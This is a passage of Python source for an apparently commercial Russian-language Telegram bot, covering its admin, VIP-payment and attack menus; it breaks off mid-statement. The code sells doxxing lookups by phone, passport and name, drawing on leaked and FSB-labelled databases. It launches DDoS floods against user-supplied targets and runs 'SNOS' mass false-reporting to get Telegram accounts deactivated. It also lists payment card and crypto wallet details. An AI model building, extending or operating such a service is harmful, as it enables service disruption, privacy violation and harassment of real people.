    if call.data == "admin_panel":
        if not is_admin(call.from_user):
            bot.answer_callback_query(call.id, "Нет доступа", show_alert=True); return
        register_user(call.from_user)
        bot.edit_message_text("🛡️ <b>Админ-панель</b>\n\nВыберите действие:",
                              cid, call.message.message_id, parse_mode="HTML",
                              reply_markup=admin_menu())
        bot.answer_callback_query(call.id); return

    if call.data == "admin_block":
        if not is_admin(call.from_user): return
        msg = bot.send_message(cid, "Введите ID пользователя для блокировки:")
        bot.register_next_step_handler(msg, process_admin_block)
        bot.answer_callback_query(call.id); return

    if call.data == "admin_unblock":
        if not is_admin(call.from_user): return
        msg = bot.send_message(cid, "Введите ID пользователя для разблокировки:")
        bot.register_next_step_handler(msg, process_admin_unblock)
        bot.answer_callback_query(call.id); return

    if call.data == "admin_list":
        if not is_admin(call.from_user): return
        text = ("📋 Список заблокированных пуст." if not blocked_users
                else "📋 <b>Заблокированные:</b>\n" +
                     "\n".join(f"• <code>{u}</code>" for u in blocked_users))
        bot.edit_message_text(text, cid, call.message.message_id, parse_mode="HTML",
                              reply_markup=admin_menu())
        bot.answer_callback_query(call.id); return

    if call.data == "admin_users":
        if not is_admin(call.from_user): return
        if not known_users:
            text = "👥 Пользователей пока нет."
        else:
            lines = [f"👥 <b>Пользователи ({len(known_users)}):</b>\n"]
            for uid_k, info in sorted(known_users.items(),
                                      key=lambda x: x[1].get("last_seen", ""),
                                      reverse=True)[:20]:
                emoji = "🚫" if int(uid_k) in blocked_users else "✅"
                free_mark = "🎁" if not info.get("free_lookup_used", False) else "—"
                lines.append(f"{emoji}{free_mark} <code>{uid_k}</code> @{info.get('username', '—')} "
                             f"({info.get('first_name', '')}) — действий: {info.get('actions', 0)}")
            text = "\n".join(lines)
        bot.edit_message_text(text, cid, call.message.message_id, parse_mode="HTML",
                              reply_markup=admin_menu())
        bot.answer_callback_query(call.id); return

    if call.data == "admin_stats":
        if not is_admin(call.from_user): return
        stats = (f"📊 <b>Статистика</b>\n\n"
                 f"👥 Пользователей всего: {len(known_users)}\n"
                 f"🎁 Бесплатных пробивов использовано: "
                 f"{sum(1 for u in known_users.values() if u.get('free_lookup_used'))}\n"
                 f"🎁 Бесплатных пробивов осталось: "
                 f"{sum(1 for u in known_users.values() if not u.get('free_lookup_used'))}\n"
                 f"🚫 Заблокировано: {len(blocked_users)}\n"
                 f"📡 Сайтов в мониторинге: {sum(len(v) for v in monitored_sites.values())}\n"
                 f"📝 Активных чатов с отчётами: {len(last_reports)}\n"
                 f"🗄️ Interbase: {len(interbase_cache)}\n"
                 f"📇 Getcontact: {len(getcontact_cache)}\n"
                 f"🚨 ФСБ (телефоны): {len(fsb_cache)}\n"
                 f"📇 ФСБ метки (xlsx): {len(fsb_numbers)}\n"
                 f"👁 God_eye (телефоны): {len(god_eye_by_phone)}\n"
                 f"✈️ Telegram база: {len(tg_db_by_id)} ID\n"
                 f"📦 Generic phone: {len(generic_phone_cache)}\n"
                 f"💎 VIP-пользователей: {len(vip_users)}\n"
                 f"💰 Заявок на оплату: {sum(1 for p in vip_payments if p.get('status') == 'pending')}\n"
                 f"📨 SNOS: отправителей {len(SNOS_SENDERS)}, "
                 f"получателей {len(SNOS_RECEIVERS)}\n"
                 f"🌐 SNOS WEB: запросов {snos_web_config.get('broadcast_count', 1000)}\n"
                 f"💣 DDoS атак: {ddos_stats.get('attacks', 0)}\n"
                 f"🌐 Apify People: {'ON' if APIFY_TOKEN else 'OFF'}\n"
                 f"🆔 Apify TPS: {'ON' if APIFY_TOKEN else 'OFF'}\n"
                 f"📞 TruecallerPy: {'ON' if TRUECALLER_INSTALLATION_ID else 'OFF'}\n"
                 f"🗺️ Street View: {'ON' if GOOGLE_STREETVIEW_KEY else 'OFF (fallback)'}\n"
                 f"🕵️ Sherlock сайтов: {len(load_sherlock_sites())}\n"
                 f"💎 Крипта: {CRYPTO_PAYMENT_INFO['network']} → {CRYPTO_PAYMENT_INFO['address']} "
                 f"(курс {CRYPTO_PAYMENT_INFO['rub_per_ton']} ₽/монета)\n"
                 f"🛠️ Технический перерыв: {'ВКЛ' if is_maintenance() else 'ВЫКЛ'}")
        bot.edit_message_text(stats, cid, call.message.message_id, parse_mode="HTML",
                              reply_markup=admin_menu())
        bot.answer_callback_query(call.id); return

    if call.data == "admin_reloaddb":
        if not is_admin(call.from_user): return
        bot.answer_callback_query(call.id, "Перезагрузка баз...")
        for k in db_loaded: db_loaded[k] = False
        load_dynamic_databases()
        bot.edit_message_text("✅ Базы перезагружены.", cid, call.message.message_id,
                              reply_markup=admin_menu())
        return

    if call.data == "owner_broadcast":
        if not (is_admin(call.from_user) or is_owner(call.from_user)):
            bot.answer_callback_query(call.id, "Нет доступа", show_alert=True); return
        msg = bot.send_message(
            cid,
            "📣 <b>Рассылка всем пользователям</b>\n\n"
            "Отправь текст сообщения — я разошлю его от имени владельца "
            "всем, кто когда-либо запускал бота.\n\n"
            "Поддерживается HTML: <b>жирный</b>, <i>курсив</i>, <code>код</code>, ссылки.",
            parse_mode="HTML")
        bot.register_next_step_handler(msg, process_owner_broadcast)
        bot.answer_callback_query(call.id); return

    if call.data == "menu_sherlock":
        bot.edit_message_text(
            "🕵️ <b>Поиск по никнейму (Sherlock)</b>\n\n"
            "Отправьте ник:\n<code>/nick username</code>\n\n"
            "Бот проверит его по списку сайтов из открытого проекта Sherlock "
            "(400+ соцсетей, форумов, игровых платформ).\n\n"
            "⚠️ <i>Проверяется только наличие публичного профиля, "
            "а не личность владельца.</i>",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=back_menu())
        bot.answer_callback_query(call.id); return

    if call.data == "menu_vk":
        bot.edit_message_text(
            "🔗 <b>VK по ссылке</b>\n\n"
            "Отправьте ссылку на профиль:\n<code>/vk https://vk.com/username</code>\n\n"
            "Бот покажет публично указанные номера в контактах профиля.\n\n"
            "⚠️ <i>Привязанный к аккаунту номер VK API не отдаёт — "
            "он доступен только владельцу аккаунта.</i>",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=back_menu())
        bot.answer_callback_query(call.id); return

    if call.data == "vip_menu":
        status = "активен" if has_vip(call.from_user) else "не активен"
        try:
            bot.edit_message_text(
                f"💎 <b>VIP-доступ</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"<b>Статус:</b> {status}\n"
                f"<b>Действует до:</b> {vip_until_text(call.from_user)}\n\n"
                f"Оплата: 💳 рубли (ЮMoney), 🪙 NFT (@lonazov) или 💎 крипта (TON).\n"
                f"В любом случае обязателен скриншот подтверждения.\n\nВыберите действие:",
                cid, call.message.message_id, parse_mode="HTML",
                reply_markup=vip_menu(call.from_user))
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data == "vip_buy":
        register_user(call.from_user, "открыл покупку VIP")
        try:
            bot.edit_message_text(
                "💎 <b>Выберите тариф</b>\n━━━━━━━━━━━━━━━━━━\n"
                "После выбора бот предложит способ оплаты: 💳 рубли, 🪙 NFT или 💎 крипта (TON).\n"
                "В любом случае нужен скриншот подтверждения.",
                cid, call.message.message_id, parse_mode="HTML",
                reply_markup=vip_buy_menu())
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data.startswith("vip_buy:"):
        key = call.data.split(":", 1)[1]
        item = vip_prices.get(key)
        if not item:
            bot.answer_callback_query(call.id, "Тариф не найден", show_alert=True); return
        register_user(call.from_user, f"выбрал тариф VIP: {item['label']}")
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(types.InlineKeyboardButton("🟦 💳 Оплатить рублями (ЮMoney)", callback_data=f"vip_pay_rub:{key}"))
        kb.add(types.InlineKeyboardButton("🟦 🪙 Оплатить NFT (@lonazov)", callback_data=f"vip_pay_nft:{key}"))
        kb.add(types.InlineKeyboardButton("🟦 💎 Оплатить криптой (TON)", callback_data=f"vip_pay_crypto:{key}"))
        kb.add(types.InlineKeyboardButton("🟦 ⬅️ Назад", callback_data="vip_buy"))
        try:
            bot.edit_message_text(
                f"💎 <b>Оплата VIP: {item['label']}</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"<b>Стоимость:</b> {item['price']} ₽\n\n"
                f"Выберите способ оплаты:\n\n"
                f"💳 <b>Рубли</b> — перевод на карту ЮMoney\n"
                f"🪙 <b>NFT</b> — отправка NFT на @lonazov\n"
                f"💎 <b>Крипта</b> — перевод TON на адрес бота\n\n"
                f"⚠️ В любом случае обязателен скриншот подтверждения.",
                cid, call.message.message_id, parse_mode="HTML", reply_markup=kb)
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data.startswith("vip_pay_rub:"):
        key = call.data.split(":", 1)[1]
        item = vip_prices.get(key)
        if not item:
            bot.answer_callback_query(call.id, "Тариф не найден", show_alert=True); return
        register_user(call.from_user, f"выбрал оплату рублями: {item['label']}")
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(types.InlineKeyboardButton("🟦 📸 Я оплатил — отправить скрин", callback_data=f"vip_proof:{key}:rub"))
        kb.add(types.InlineKeyboardButton("🟦 ⬅️ Назад", callback_data=f"vip_buy:{key}"))
        pay = VIP_PAYMENT_INFO
        try:
            bot.edit_message_text(
                f"💳 <b>Оплата рублями: {item['label']}</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"<b>К оплате:</b> {item['price']} ₽\n\n"
                f"<b>Реквизиты:</b>\n"
                f"  🏦 <b>Банк:</b> {pay.get('bank', '—')}\n"
                f"  💳 <b>Карта:</b> <code>{pay['card']}</code>\n"
                f"  👤 <b>Получатель:</b> {pay.get('holder', '—')}\n\n"
                f"<i>{pay['note']}</i>\n\n"
                f"⚠️ После оплаты нажми «📸 Я оплатил» и пришли скриншот чека. "
                f"Без скрина заявка не создаётся.",
                cid, call.message.message_id, parse_mode="HTML", reply_markup=kb)
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data.startswith("vip_pay_nft:"):
        key = call.data.split(":", 1)[1]
        item = vip_prices.get(key)
        if not item:
            bot.answer_callback_query(call.id, "Тариф не найден", show_alert=True); return
        register_user(call.from_user, f"выбрал оплату NFT: {item['label']}")
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(types.InlineKeyboardButton("🟦 📸 Я оплатил NFT — отправить скрин", callback_data=f"vip_proof:{key}:nft"))
        kb.add(types.InlineKeyboardButton("🟦 ⬅️ Назад", callback_data=f"vip_buy:{key}"))
        pay = NFT_PAYMENT_INFO
        try:
            bot.edit_message_text(
                f"🪙 <b>Оплата NFT: {item['label']}</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"<b>К оплате:</b> {item['price']} ₽ (эквивалент в NFT)\n\n"
                f"<b>Реквизиты:</b>\n"
                f"  🪙 <b>Сеть:</b> {pay['network']}\n"
                f"  🖼 <b>Коллекция:</b> <code>{pay['collection']}</code>\n"
                f"  👤 <b>Получатель:</b> {pay['receiver']}\n\n"
                f"<i>{pay['wallet_hint']}</i>\n\n"
                f"⚠️ После отправки нажми «📸 Я оплатил NFT» и пришли скриншот "
                f"транзакции. Без скрина заявка не создаётся.",
                cid, call.message.message_id, parse_mode="HTML", reply_markup=kb)
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data.startswith("vip_pay_crypto:"):
        key = call.data.split(":", 1)[1]
        item = vip_prices.get(key)
        if not item:
            bot.answer_callback_query(call.id, "Тариф не найден", show_alert=True); return
        register_user(call.from_user, f"выбрал оплату криптой (TON): {item['label']}")
        rub_per_ton = float(CRYPTO_PAYMENT_INFO.get("rub_per_ton", 89))
        ton_amount = round(item["price"] / rub_per_ton, 4)
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(types.InlineKeyboardButton("🟦 📸 Я оплатил крипту — отправить скрин",
                                          callback_data=f"vip_proof:{key}:crypto"))
        kb.add(types.InlineKeyboardButton("🟦 ⬅️ Назад", callback_data=f"vip_buy:{key}"))
        pay = CRYPTO_PAYMENT_INFO
        try:
            bot.edit_message_text(
                f"💎 <b>Оплата криптой (TON): {item['label']}</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"<b>Стоимость:</b> {item['price']} ₽\n"
                f"<b>Курс:</b> 1 TON = {rub_per_ton:.0f} ₽\n"
                f"<b>К переводу:</b> <code>{ton_amount} TON</code>\n\n"
                f"<b>Реквизиты:</b>\n"
                f"  💎 <b>Сеть:</b> {pay['network']}\n"
                f"  📬 <b>Адрес:</b> <code>{pay['address']}</code>\n"
                f"  👤 <b>Получатель:</b> {pay['holder']}\n\n"
                f"<i>{pay['note']}</i>\n\n"
                f"⚠️ После перевода нажми «📸 Я оплатил крипту» и пришли скрин/хеш транзакции. "
                f"Без подтверждения заявка не создаётся.",
                cid, call.message.message_id, parse_mode="HTML", reply_markup=kb)
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data.startswith("vip_proof:"):
        _, key, method = call.data.split(":", 2)
        item = vip_prices.get(key)
        if not item:
            bot.answer_callback_query(call.id, "Тариф не найден", show_alert=True); return
        method_label = {
            "rub": "💳 Рубли (ЮMoney)",
            "nft": "🪙 NFT (@lonazov)",
            "crypto": "💎 Крипта (TON)",
        }.get(method, method)
        last_reports[f"vip_proof_{cid}"] = {
            "tariff": key, "label": item["label"], "price": item["price"],
            "days": item["days"], "method": method,
        }
        msg = bot.send_message(
            cid,
            f"📸 <b>Подтверждение оплаты</b>\n"
            f"Тариф: {item['label']} ({item['price']} ₽)\n"
            f"Способ: {method_label}\n\n"
            f"Пришли <b>скриншот</b> подтверждения "
            f"({'чека перевода' if method == 'rub' else 'транзакции NFT' if method == 'nft' else 'транзакции (хеш/скрин из кошелька)'}). "
            f"Фото или файл-изображение.\n\n"
            f"Без скрина заявка не создаётся.",
            parse_mode="HTML")
        bot.register_next_step_handler(msg, process_vip_proof)
        bot.answer_callback_query(call.id); return

    if call.data == "vip_status":
        rec = vip_users.get(str(uid), {})
        if not rec and not is_admin(call.from_user) and not is_owner(call.from_user):
            status_text = "❌ VIP не активен"
        else:
            status_text = (
                f"✅ VIP активен\n"
                f"<b>С:</b> {datetime.fromtimestamp(rec.get('since', time.time())).strftime('%Y-%m-%d %H:%M') if rec else '—'}\n"
                f"<b>До:</b> {vip_until_text(call.from_user)}\n"
                f"<b>Выдал:</b> {rec.get('granted_by', '—') if rec else 'owner'}")
        try:
            bot.edit_message_text(f"📅 <b>Мой VIP-статус</b>\n━━━━━━━━━━━━━━━━━━\n{status_text}",
                                  cid, call.message.message_id, parse_mode="HTML",
                                  reply_markup=vip_menu(call.from_user))
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data == "vip_rules":
        try:
            bot.edit_message_text(
                "📜 <b>Что даёт VIP</b>\n━━━━━━━━━━━━━━━━━━\n"
                "• 📞 Поиск по номеру (200+ live-API и архивов)\n"
                "• 🆔 Apify People Search / TruePeopleSearch / Phone Enrichment\n"
                "• 📧 Поиск по Email (+ Apify)\n"
                "• 🌐 Поиск по IP + 📸 фото здания\n"
                "• 👤 Поиск по ФИО (+ Apify TPS)\n"
                "• 🌍 Информация о сайте\n"
                "• 🏠 Кадастр по адресу\n"
                "• 📍 Обратное геокодирование + 📸 фото здания\n"
                "• 📱 Telegram OSINT\n"
                "• 🆔 Поиск по TG ID\n"
                "• 🆔 Поиск по паспорту\n"
                "• 👥 Одноклассники\n"
                "• 🖼️ Поиск по фото\n"
                "• 🕵️ Поиск по никнейму (Sherlock)\n"
                "• 🔗 VK по ссылке\n"
                "• 🗄️ Локальные базы\n"
                "• 📘 Facebook Email базы\n"
                "• 📦 Универсальные базы\n"
                "• 💣 DDoS-панель\n"
                "• 📨 SNOS WEB (1000 запросов за запуск)\n"
                "• 📧 SNOS через почты\n"
                "• 📥 Экспорт PDF/XML\n\n"
                "💳 Оплата: рубли (ЮMoney), 🪙 NFT (@lonazov) или 💎 крипта (TON).\n"
                "💎 Крипта: TON → UQA6php32B3jtOuy-hNFDktjeA-Tkpb4d2T95jzDZMlV5Tah\n"
                "   (эквивалент стоимости в рублях по фиксированному курсу)\n"
                "📸 В любом случае обязателен скриншот подтверждения.\n\n"
                "📡 Uptime-мониторинг доступен без VIP.\n"
                "🎁 Первый пробив — бесплатно (1 раз).",
                cid, call.message.message_id, parse_mode="HTML",
                reply_markup=vip_menu(call.from_user))
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data == "vip_admin":
        if not (is_admin(call.from_user) or is_owner(call.from_user)):
            bot.answer_callback_query(call.id, "Нет доступа", show_alert=True); return
        try:
            bot.edit_message_text(
                "🛡️ <b>Управление VIP</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"Всего VIP: {len(vip_users)}\n"
                f"Заявок в ожидании: {sum(1 for p in vip_payments if p.get('status') == 'pending')}",
                cid, call.message.message_id, parse_mode="HTML",
                reply_markup=vip_admin_menu())
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data == "vip_grant":
        if not (is_admin(call.from_user) or is_owner(call.from_user)):
            bot.answer_callback_query(call.id, "Нет доступа", show_alert=True); return
        msg = bot.send_message(
            cid,
            "Введите: <code>ID дни</code>\n"
            "Например: <code>123456789 30</code>\n"
            "Для бессрочного VIP: <code>123456789 -1</code>",
            parse_mode="HTML")
        bot.register_next_step_handler(msg, process_vip_grant)
        bot.answer_callback_query(call.id); return

    if call.data == "vip_revoke":
        if not (is_admin(call.from_user) or is_owner(call.from_user)):
            bot.answer_callback_query(call.id, "Нет доступа", show_alert=True); return
        msg = bot.send_message(cid, "Введите ID пользователя для снятия VIP:")
        bot.register_next_step_handler(msg, process_vip_revoke)
        bot.answer_callback_query(call.id); return

    if call.data == "vip_list":
        if not (is_admin(call.from_user) or is_owner(call.from_user)):
            bot.answer_callback_query(call.id, "Нет доступа", show_alert=True); return
        if not vip_users:
            text = "📋 VIP-пользователей нет."
        else:
            lines = [f"📋 <b>VIP-пользователи ({len(vip_users)}):</b>\n"]
            for uid_k, rec in list(vip_users.items())[:50]:
                info = known_users.get(uid_k, {})
                until = rec.get("until", 0)
                until_text = "бессрочно" if until == -1 else datetime.fromtimestamp(until).strftime("%Y-%m-%d")
                lines.append(f"• <code>{uid_k}</code> @{info.get('username', '—')} — "
                             f"до: {until_text} (выдал: {rec.get('granted_by', '—')})")
            text = "\n".join(lines)
        try:
            bot.edit_message_text(text, cid, call.message.message_id, parse_mode="HTML",
                                  reply_markup=vip_admin_menu())
        except Exception:
            bot.send_message(cid, text, parse_mode="HTML", reply_markup=vip_admin_menu())
        bot.answer_callback_query(call.id); return

    if call.data == "vip_orders":
        if not (is_admin(call.from_user) or is_owner(call.from_user)):
            bot.answer_callback_query(call.id, "Нет доступа", show_alert=True); return
        pending = [p for p in vip_payments if p.get("status") == "pending"]
        if not pending:
            try:
                bot.edit_message_text("💰 Заявок в ожидании нет.", cid, call.message.message_id,
                                      reply_markup=vip_admin_menu())
            except Exception:
                pass
            bot.answer_callback_query(call.id); return
        kb = types.InlineKeyboardMarkup(row_width=1)
        for p in pending[:10]:
            m = "💳" if p.get("method", "rub") == "rub" else ("🪙" if p.get("method") == "nft" else "💎")
            kb.add(types.InlineKeyboardButton(
                f"🟦 ✅ {m} {p['label']} — @{p['username'] or p['user_id']}",
                callback_data=f"vip_order_ok:{p['id']}"))
            kb.add(types.InlineKeyboardButton(
                f"🟦 ❌ Отклонить — @{p['username'] or p['user_id']}",
                callback_data=f"vip_order_no:{p['id']}"))
        kb.add(types.InlineKeyboardButton("🟦 ⬅️ Назад", callback_data="vip_admin"))
        text = f"💰 <b>Заявки в ожидании ({len(pending)}):</b>\n\n"
        for p in pending[:10]:
            m = "💳" if p.get("method", "rub") == "rub" else ("🪙" if p.get("method") == "nft" else "💎")
            text += (f"• <code>{p['id']}</code> — {m} {p['label']} ({p['price']}₽) "
                     f"от @{p['username'] or p['user_id']}\n")
        try:
            bot.edit_message_text(text, cid, call.message.message_id, parse_mode="HTML", reply_markup=kb)
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data.startswith("vip_order_ok:"):
        if not (is_admin(call.from_user) or is_owner(call.from_user)):
            bot.answer_callback_query(call.id, "Нет доступа", show_alert=True); return
        oid = call.data.split(":", 1)[1]
        order = next((p for p in vip_payments if p["id"] == oid), None)
        if not order:
            bot.answer_callback_query(call.id, "Заявка не найдена", show_alert=True); return
        order["status"] = "approved"
        save_payments()
        grant_vip(order["user_id"], order["days"], granted_by=call.from_user.username or "admin")
        proof = order.get("proof_path")
        if proof and os.path.exists(proof):
            try: os.remove(proof)
            except Exception: pass
        register_user(call.from_user, f"подтвердил VIP для {order['user_id']}")
        method_label = {
            "rub": "💳 Рубли",
            "nft": "🪙 NFT",
            "crypto": "💎 Крипта (TON)",
        }.get(order.get("method", "rub"), "—")
        try:
            bot.send_message(order["user_id"],
                             f"✅ <b>VIP активирован!</b>\n\n"
                             f"<b>Тариф:</b> {order['label']}\n"
                             f"<b>Способ:</b> {method_label}\n"
                             f"<b>Действует до:</b> {vip_until_text(order['user_id'])}\n\n"
                             f"Приятного использования!", parse_mode="HTML")
        except Exception:
            pass
        bot.answer_callback_query(call.id, "VIP выдан")
        try:
            bot.edit_message_text("✅ Заявка подтверждена.", cid, call.message.message_id,
                                  reply_markup=vip_admin_menu())
        except Exception:
            pass
        return

    if call.data.startswith("vip_order_no:"):
        if not (is_admin(call.from_user) or is_owner(call.from_user)):
            bot.answer_callback_query(call.id, "Нет доступа", show_alert=True); return
        oid = call.data.split(":", 1)[1]
        order = next((p for p in vip_payments if p["id"] == oid), None)
        if not order:
            bot.answer_callback_query(call.id, "Заявка не найдена", show_alert=True); return
        order["status"] = "rejected"
        save_payments()
        try:
            bot.send_message(order["user_id"],
                             "❌ Ваша заявка на VIP отклонена. Свяжитесь с администратором.")
        except Exception:
            pass
        bot.answer_callback_query(call.id, "Отклонено")
        try:
            bot.edit_message_text("❌ Заявка отклонена.", cid, call.message.message_id,
                                  reply_markup=vip_admin_menu())
        except Exception:
            pass
        return

    if call.data == "vip_edit_pay":
        if not (is_admin(call.from_user) or is_owner(call.from_user)):
            bot.answer_callback_query(call.id, "Нет доступа", show_alert=True); return
        msg = bot.send_message(
            cid,
            "Введите реквизиты (рубли) в формате:\n"
            "<code>банк|карта|получатель|примечание</code>\n\n"
            "Пример:\n"
            "<code>ЮMoney|2204 1201 4497 4629|Лоназов|После оплаты пришлите скриншот.</code>",
            parse_mode="HTML")
        bot.register_next_step_handler(msg, process_vip_edit_pay)
        bot.answer_callback_query(call.id); return

    if call.data == "vip_edit_nft":
        if not (is_admin(call.from_user) or is_owner(call.from_user)):
            bot.answer_callback_query(call.id, "Нет доступа", show_alert=True); return
        msg = bot.send_message(
            cid,
            "Введите реквизиты (NFT) в формате:\n"
            "<code>сеть|коллекция|получатель|примечание</code>\n\n"
            "Пример:\n"
            "<code>TON|lonazov_vip|@lonazov|После отправки пришлите скриншот.</code>",
            parse_mode="HTML")
        bot.register_next_step_handler(msg, process_vip_edit_nft)
        bot.answer_callback_query(call.id); return

    if call.data == "vip_edit_crypto":
        if not (is_admin(call.from_user) or is_owner(call.from_user)):
            bot.answer_callback_query(call.id, "Нет доступа", show_alert=True); return
        msg = bot.send_message(
            cid,
            "Введите реквизиты (крипта) в формате:\n"
            "<code>сеть|адрес|курс_руб_за_1_монету|примечание</code>\n\n"
            "Пример:\n"
            "<code>TON|UQA6php32B3jtOuy-hNFDktjeA-Tkpb4d2T95jzDZMlV5Tah|89|После перевода пришлите скриншот.</code>",
            parse_mode="HTML")
        bot.register_next_step_handler(msg, process_vip_edit_crypto)
        bot.answer_callback_query(call.id); return

    if call.data == "ddos_menu":
        if not has_vip(call.from_user) and not is_admin(call.from_user):
            bot.answer_callback_query(call.id, "Только для VIP", show_alert=True); return
        register_user(call.from_user, "открыл DDoS")
        bot.edit_message_text(
            "💣 <b>DDoS-панель</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"Атак: {ddos_stats.get('attacks', 0)}\n"
            f"Запросов: {ddos_stats.get('total_requests', 0)}\n"
            f"Ошибок: {ddos_stats.get('failed', 0)}\n"
            f"В очереди: {len(_ddos_queue)}",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=ddos_menu())
        bot.answer_callback_query(call.id); return

    if call.data == "ddos_start":
        process_ddos_start(call); return

    if call.data == "ddos_stats_view":
        if not has_vip(call.from_user) and not is_admin(call.from_user):
            bot.answer_callback_query(call.id, "Только для VIP", show_alert=True); return
        lines = [f"📊 <b>DDoS статистика</b>\nВсего атак: {ddos_stats.get('attacks', 0)}\n"
                 f"Всего запросов: {ddos_stats.get('total_requests', 0)}\n"
                 f"Ошибок: {ddos_stats.get('failed', 0)}\n"]
        if _ddos_active:
            lines.append("\n<b>Активные:</b>")
            for jid, s in _ddos_active.items():
                lines.append(f"• <code>{jid}</code> — {s.get('requests', 0)} запросов")
        bot.edit_message_text("\n".join(lines), cid, call.message.message_id,
                              parse_mode="HTML", reply_markup=ddos_menu())
        bot.answer_callback_query(call.id); return

    if call.data == "ddos_settings":
        if not is_admin(call.from_user):
            bot.answer_callback_query(call.id, "Только для админа", show_alert=True); return
        bot.edit_message_text(
            "⚙️ <b>Настройки DDoS</b>\n"
            f"Методы: {', '.join(ddos_config.get('methods', []))}\n"
            f"Потоков: {ddos_config.get('threads', 200)}\n"
            f"Длительность: {ddos_config.get('duration', 60)}с\n"
            f"Rate limit: {ddos_config.get('rate_limit', 1000)}",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=ddos_menu())
        bot.answer_callback_query(call.id); return

    if call.data.startswith("ddos_m:"):
        if not has_vip(call.from_user) and not is_admin(call.from_user):
            bot.answer_callback_query(call.id, "Только для VIP", show_alert=True); return
        method = call.data.split(":", 1)[1]
        data = last_reports.get(f"ddos_{cid}")
        if not data or "target" not in data:
            bot.answer_callback_query(call.id, "Сначала укажите цель", show_alert=True); return
        target = data["target"]
        duration = ddos_config.get("duration", 60)
        threads = ddos_config.get("threads", 200)
        rate_limit = ddos_config.get("rate_limit", 1000)
        ddos_enqueue(cid, uid, target, method, duration, threads, rate_limit)
        bot.answer_callback_query(call.id, "DDoS запущен")
        bot.edit_message_text(
            f"💣 <b>DDoS запущен</b>\nЦель: <code>{target}</code>\n"
            f"Метод: {method}\nДлительность: {duration}с\nПотоков: {threads}",
            cid, call.message.message_id, parse_mode="HTML", reply_markup=ddos_menu())
        return

    if call.data == "snos_menu":
        if not has_vip(call.from_user):
            bot.answer_callback_query(call.id, "Только для VIP", show_alert=True); return
        register_user(call.from_user, "открыл SNOS")
        try:
            bot.edit_message_text(
                "📨 <b>SNOS — жалобы в поддержку Telegram</b>\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"<b>Почтовый пул:</b> {len(SNOS_SENDERS)} отправителей × "
                f"{len(SNOS_RECEIVERS)} получателей\n"
                f"<b>Запросов за запуск:</b> {snos_web_config.get('broadcast_count', 1000)}\n\n"
                "Выберите способ:",
                cid, call.message.message_id, parse_mode="HTML", reply_markup=snos_menu())
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data == "snos_mail_menu":
        if not has_vip(call.from_user):
            bot.answer_callback_query(call.id, "Только для VIP", show_alert=True); return
        try:
            bot.edit_message_text(
                "📧 <b>SNOS через почты</b>\n"
                f"Отправителей: {len(SNOS_SENDERS)}\n"
                f"Получателей: {len(SNOS_RECEIVERS)}\n"
                f"Писем за 1 запуск: {len(SNOS_SENDERS) * len(SNOS_RECEIVERS)}\n\n"
                "Выберите тип жалобы:",
                cid, call.message.message_id, parse_mode="HTML", reply_markup=snos_mail_menu())
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data == "snos_web_menu":
        if not has_vip(call.from_user):
            bot.answer_callback_query(call.id, "Только для VIP", show_alert=True); return
        try:
            bot.edit_message_text(
                "🌐 <b>SNOS WEB — прямые запросы к Telegram</b>\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"<b>Задержка:</b> {snos_web_config.get('delay_min', 0.8)}–"
                f"{snos_web_config.get('delay_max', 3.2)}с\n"
                f"<b>Запросов за запуск:</b> {snos_web_config.get('broadcast_count', 1000)}\n\n"
                "Выбери режим:",
                cid, call.message.message_id, parse_mode="HTML", reply_markup=snos_web_menu())
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data == "snos_web_support_form":
        if not has_vip(call.from_user):
            bot.answer_callback_query(call.id, "Только для VIP", show_alert=True); return
        msg = bot.send_message(
            cid,
            "Введи текст жалобы для формы support (одним сообщением):\n"
            "Например: <i>Пользователь @spammer рассылает спам в чате t.me/xxx</i>",
            parse_mode="HTML")
        bot.register_next_step_handler(msg, snos_web_support_step)
        bot.answer_callback_query(call.id); return

    if call.data == "snos_web_deact_form":
        if not has_vip(call.from_user):
            bot.answer_callback_query(call.id, "Только для VIP", show_alert=True); return
        msg = bot.send_message(
            cid, "Введи номер в формате <code>+79161234567</code> для деактивации:",
            parse_mode="HTML")
        bot.register_next_step_handler(msg, snos_web_deact_step)
        bot.answer_callback_query(call.id); return

    if call.data == "snos_web_settings":
        if not is_admin(call.from_user):
            bot.answer_callback_query(call.id, "Только для админа", show_alert=True); return
        try:
            bot.edit_message_text(
                "⚙️ <b>Настройки SNOS WEB</b>\n"
                f"Задержка: <code>{snos_web_config.get('delay_min', 0.8)}–"
                f"{snos_web_config.get('delay_max', 3.2)}</code>\n"
                f"Запросов: <code>{snos_web_config.get('broadcast_count', 1000)}</code>\n\n"
                "Доступные команды:\n"
                "<code>/snos_web_count 1000</code>",
                cid, call.message.message_id, parse_mode="HTML", reply_markup=snos_web_menu())
        except Exception:
            pass
        bot.answer_callback_query(call.id); return

    if call.data == "snos_web_stats":
        if not is_admin(call.from_user):
            bot.answer_callback_query(call.id, "Только для админа", show_alert=True); return
        s = snos_web_stats
        try:
            bot.edit_message_text(
